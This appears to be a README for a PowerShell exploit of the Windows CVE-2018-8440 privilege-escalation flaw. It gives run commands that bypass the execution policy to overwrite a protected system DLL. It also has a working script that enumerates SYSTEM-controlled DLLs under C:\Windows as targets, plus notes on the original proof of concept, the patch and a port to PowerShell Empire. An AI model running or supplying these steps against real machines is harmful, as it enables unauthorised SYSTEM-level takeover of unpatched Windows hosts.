# Usage
```
Set-ExecutionPolicy Bypass Process
.\exploit.ps1 -TargetFile C:\Windows\Some.dll
```
This will exploit the Windows operating system allowing you to modify the file Some.dll.

# Example
```
Set-ExecutionPolicy Bypass Process
.\example.ps1
```
https://youtu.be/rNSpxJd3_BM
# Finding Vulnerable DLL files
```
$aapsid = 'NT AUTHORITY\SYSTEM'

ForEach($file in (Get-ChildItem -File -recurse -Path 'C:\windows' -Filter *.dll -ErrorAction SilentlyContinue)) {
 
   $acl = Get-Acl -path $file.FullName
   ForEach($ace in $acl.Access) {
      If(($ace.FileSystemRights -eq
           [Security.AccessControl.FileSystemRights]::FullControl) -and 
            $ace.IdentityReference.Value -in $aapsid) {
               Write-Output $file.FullName
              
      }
        
   }
   
   }
```
# Further Information
The first PoC was released by [@SandboxEscaper](https://twitter.com/sandboxescaper) on the 27th August 2018, however, is now removed from GitHub.

The exploit.dll and the code for the TriggerXPSPrint.cpp comes from her original PoC. The exploit.dll simply launches notepad.
I tried to replicate the XPS print api into C# but using `System.Printing` or `System.Drawing.Printing` only calls the print job within the current user context, you need to use the API to get the spooler service to initate the print job.

This was patched by Microsoft on the 11th September 2018. The following link has the relevant KB numbers:
https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2018-8440

I since then have modified this to work with PowerShell Empire, you can read the pull request here:
https://github.com/EmpireProject/Empire/pull/1230

I have only tested this on Windows 10, in theory it should work on other versions.
